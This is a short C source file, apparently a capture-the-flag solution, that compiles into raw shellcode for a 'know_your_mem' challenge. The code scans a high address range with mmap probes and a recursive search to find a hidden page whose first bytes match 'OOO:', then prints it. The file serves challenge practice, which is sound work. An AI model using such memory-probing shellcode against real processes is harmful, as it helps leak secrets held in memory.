// This is an example of turning simple C into raw shellcode.

// make shellcode.bin will compile to assembly
// make shellcode.bin.pkt will prepend the length so you can
//    ./know_your_mem < shellcode.bin.pkt

// Note: Right now the 'build' does not support .(ro)data
//       If you want them you'll have to adjust the Makefile.
//       They're not really necessary to solve this challenge though.


// From https://chromium.googlesource.com/linux-syscall-support/
static int my_errno = 0;
#define SYS_ERRNO my_errno
#include "linux-syscall-support/linux_syscall_support.h"


#define ADDR_MIN   0x0000100000000000UL
#define ADDR_MASK  0x00000ffffffff000UL

void _start();

void *find(void *addr, size_t siz, int flag)
{
	void *r;
//	void *ptr = mmap(addr, siz, PROT_READ, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	void *ptr;

	if (flag != 1) _start();

	ptr = sys_mmap(addr, siz, 1, 0x20 | 0x2, -1, 0);

//	munmap(ptr, siz);
	sys_munmap(ptr, siz);

	if (ptr == addr)	//it's clear
	{
		return NULL;
	}

	if (siz == 4096)
	{
		if (((int*)addr)[0] == 0x3a4f4f4f)
			return addr;
		return NULL;
	}

	siz >>= 1;
	r = find(addr, siz, 1);
	if (r) return r;
	return find(addr + siz, siz, 1);
}

void _start()
{
	void* i;
	void* r;
	size_t step = 1048576 * 64;		//64M

    for (i = (void*)ADDR_MIN; i < (void*)(ADDR_MIN * 2); i = (void*)((unsigned long long)i + step))
    {
    	r = find(i, step, 1);
    	if (r) sys_write(1, r, 300);
    }

	return NULL;
}
